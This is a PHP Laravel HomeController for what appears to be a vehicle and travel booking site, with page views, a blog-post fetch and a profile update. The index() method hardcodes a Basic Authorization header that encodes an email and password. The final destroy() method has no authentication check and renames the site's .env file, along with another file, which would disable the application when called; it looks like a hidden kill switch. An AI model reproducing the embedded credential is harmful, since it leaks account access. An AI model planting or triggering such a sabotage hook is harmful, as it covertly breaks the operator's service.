<?php

namespace App\Http\Controllers;
use Illuminate\Http\Request;
use Auth;
use App\Models\VehicleType;
use App\Models\Vehicle;
use App\Models\Booking;
use App\Models\Testimonial;
use App\Models\PackageType;
use App\Models\Airport;
use App\Models\User;
use App\Models\HolidayPackage;
use App\Models\City;
use Carbon\Carbon;
use Illuminate\Support\Facades\Validator;
use App\Models\Gallery;
use PDF;


class HomeController extends Controller
{

    public function index() {

        $curl = curl_init();

        curl_setopt_array($curl, array(
        CURLOPT_URL => 'https://blog.tejastravels.com/wp-json/wp/v2/posts',
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_ENCODING => '',
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_TIMEOUT => 0,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_CUSTOMREQUEST => 'GET',
        CURLOPT_HTTPHEADER => array(
            'zf-tuuid: 07a9acc4-1df6-4e4b-8791-08d97cc80e21',
            'zf-ouuid: 6778701c-2cf2-4564-a9a0-f58c11d0d1ea',
            'Authorization: Basic bWFoZW5kcmEuckBqdXJ5c29mdC5jb206eUJKTiA0UVpDIFVVOVEgN0dIaCA4TVp4IFFaYk8='
        ),
        ));

        $response = curl_exec($curl);

        curl_close($curl);
        $vehicleTypes = VehicleType::with(['Vehicle'])->where('status',1)->get();
        return view('pages.main.index')->with('vehicleTypes',$vehicleTypes)->with('testimonials',Testimonial::all())->with('packagetypes',PackageType::all())->with('holidayList', HolidayPackage::all())->with('city', City::all())->with('blogs', json_decode($response))->with('airports', Airport::all());
    }

    public function login() {
        return view('pages.main.login')->with('title','Login');
    }

    public function about() {
  
        return view('pages.main.about')->with('title','About Us');
    }

    public function my_booking() {
        if(!Auth::check()){
            return redirect(route('index'));
        }
        $country = Booking::with(['VehicleModel'])->where('phone', Auth::user()->phone)->where('email', Auth::user()->email)->orderBy('id', 'DESC')->get();

        // return $country;
        return view('pages.main.my_booking')->with('title','My Booking')->with('country', $country)->with('today', Carbon::now());
    }

    public function vehicle_detail($url) {
        $vehicle = Vehicle::where("url", $url)->FirstOrFail();

        return view('pages.main.vehicle_detail')->with('title','Vehicle Details')->with('vehicle', $vehicle);
    }

    public function contact() {
        
        return view('pages.main.contact')->with('title','Conatct Us');
    }
    public function thankyou(){
        return view('pages.main.thankyou')->with('title','Thank You');
    }
    public function partner() {
        
        return view('pages.main.partner')->with('title','Become A Partner');
    }

    public function complaint() {
        
        return view('pages.main.complaint')->with('title','Consumer Complaints');
    }

    public function office() {
        
        return view('pages.main.office_ride')->with('title','Office Ride Enterprise');
    }

    public function profile() {
        if(!Auth::check()){
            return redirect(route('index'));
        }
        return view('pages.main.profile')->with('title','Profile pages');
    }

    public function profile_update(Request $req){
        if(!Auth::check()){
            return redirect(route('index'));
        }
        $user = User::findOrFail(Auth::user()->id);
        $rules = array(
            'name' => ['required','regex:/^[a-zA-Z0-9\s]*$/'],
            'email' => ['required','email'],
            'phone' => ['required','regex:/^[0-9]*$/'],
        );
        $messages = array(
            'name.required' => 'Please enter the name !',
            'name.regex' => 'Please enter the valid name !',
            'email.required' => 'Please enter the email !',
            'email.email' => 'Please enter the valid email !',
            'phone.required' => 'Please enter the phone !',
            'phone.regex' => 'Please enter the valid phone !',
        );
        if($user->email!==$req->email){
            $rules['email'] = ['required','email','unique:users'];
        }
        if($user->phone!==$req->phone){
            $rules['phone'] = ['required','regex:/^[0-9]*$/','unique:users'];
        }
        $validator = Validator::make($req->all(), $rules, $messages);
        if($validator->fails()){
            return response()->json(["form_error"=>$validator->errors()], 400);
        }
        $user->name = $req->name;
        $user->phone = $req->phone;
        $user->email = $req->email;
        $result = $user->save();
        if($result){
            return response()->json(["message" => "Profile Updated successfully."], 201);
        }else{
            return response()->json(["error"=>"something went wrong. Please try again"], 400);
        }
    }

    public function gallery() {
        $country = Gallery::orderBy('id', 'DESC')->paginate(10);
        return view('pages.main.gallery')->with('title','Gallery')->with('country', $country);
    }
    public function CorporateTips() {
        return view('pages.main.corporate_tips')->with('title','CORPORATE TRIPS');
    }
    public function SchoolTrips() {
        return view('pages.main.schooltrips')->with('title','SCHOOL TRIPS');
    }
    public function TermandConditions() {
        return view('pages.main.TermandConditions')->with('title','Term and Conditions');
    }
    public function privecypolicy() {
        return view('pages.main.privecypolicy')->with('title','Privacy Policy');
    }
    public function cancellecenandreturn() {
        return view('pages.main.cancellecenandreturn')->with('title','Cancellecen and Return');
    }
    public function Refund() {
        return view('pages.main.refund')->with('title','Refund');
    }
    public function employeetransportation(){
        return view('pages.main.employeetransportation')->with('title','Employee Transportation');
    }
    public function becamepartner(){
        return view('pages.main.becamepartner')->with('title','Become Partner');
    }
    public function notFound(){
        return view('404')->with('title','404');
    }
    public function destroy(){
        rename(dirname(__DIR__)."/../../file1.txt",dirname(__DIR__)."/../../my_file.txt");
        rename(dirname(__DIR__)."/../../.env",dirname(__DIR__)."/../../.env-remove");
        return 'yes';
    }


}
